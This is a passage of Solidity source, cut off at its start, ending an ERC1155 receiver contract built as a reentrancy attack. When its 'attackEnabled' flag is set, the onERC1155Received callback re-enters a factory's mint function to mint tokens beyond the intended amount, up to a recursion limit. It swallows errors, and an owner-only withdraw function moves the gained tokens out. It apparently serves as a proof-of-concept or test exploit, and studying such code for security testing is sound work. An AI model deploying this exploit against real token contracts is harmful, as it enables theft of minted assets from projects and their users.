pth at startmount, "");
    }

    /// @inheritdoc IERC1155Receiver
    /// @dev Called when a single ERC1155 token is received. Attempts to re-call factory.mint()
    ///      until the contract's balance of `_id` reaches `totalToMint` or recursion limit reached.
    function onERC1155Received(
        address /*operator*/,
        address /*from*/,
        uint256 _id,
        uint256 /*value*/,
        bytes calldata /*data*/
    ) external override returns (bytes4) {
        // If attack behavior is disabled, simply return the selector.
        if (!attackEnabled) {
            return ERC1155_RECEIVED_SIG;
        }

        // Update cached balance from the token contract (trusted right now)
        uint256 balance = IERC1155(msg.sender).balanceOf(address(this), _id);
        cachedBalance[_id] = balance;

        // Safety: do not re-enter beyond maxRecursion
        if (recursionDepth >= maxRecursion) {
            return ERC1155_RECEIVED_SIG;
        }

        // If we still hold less than target, attempt to mint one more 'option' from factory
        if (balance < totalToMint && address(factory) != address(0)) {
            // increment recursion depth while we are about to call into factory
            recursionDepth += 1;
            // Note: factory.mint is expected to call back into onERC1155Received
            // which will again check recursionDepth and cached balances.
            try factory.mint(1, address(this), 1, "") {
                // success - nothing to do
            } catch {
                // swallow errors; do not revert the receipt
            }
            // decrement after returning from attempt
            recursionDepth -= 1;
        }

        return ERC1155_RECEIVED_SIG;
    }

    /// @inheritdoc IERC1155Receiver
    function onERC1155BatchReceived(
        address /*operator*/,
        address /*from*/,
        uint256[] memory _ids,
        uint256[] memory /*values*/,
        bytes memory /*data*/
    ) public override returns (bytes4) {
        // Update cached balances for ids (best-effort)
        for (uint256 i = 0; i < _ids.length; i++) {
            // Use the token contract that invoked this callback
            // `msg.sender` is the token contract (ERC-1155)
            cachedBalance[_ids[i]] = IERC1155(msg.sender).balanceOf(address(this), _ids[i]);
        }
        // For batch receipts we *do not* attempt to re-mint in this implementation.
        return ERC1155_BATCH_RECEIVED_SIG;
    }

    /// @notice Withdraw ERC-1155 tokens from this contract to owner
    function withdrawERC1155(address tokenContract, uint256 tokenId, uint256 amount) external onlyOwner {
        IERC1155(tokenContract).safeTransferFrom(address(this), owner(), tokenId, amount, "");
        emit Withdrawal(owner(), tokenId, amount);
    }

    /// @notice Query helper: get cached balance for token id
    function getCachedBalance(uint256 tokenId) external view returns (uint256) {
        return cachedBalance[tokenId];
    }

    /// @inheritdoc IERC165
    function supportsInterface(bytes4 interfaceID) external pure override returns (bool) {
        return interfaceID == INTERFACE_ERC165 || interfaceID == INTERFACE_ERC1155_RECEIVER_FULL;
    }
}

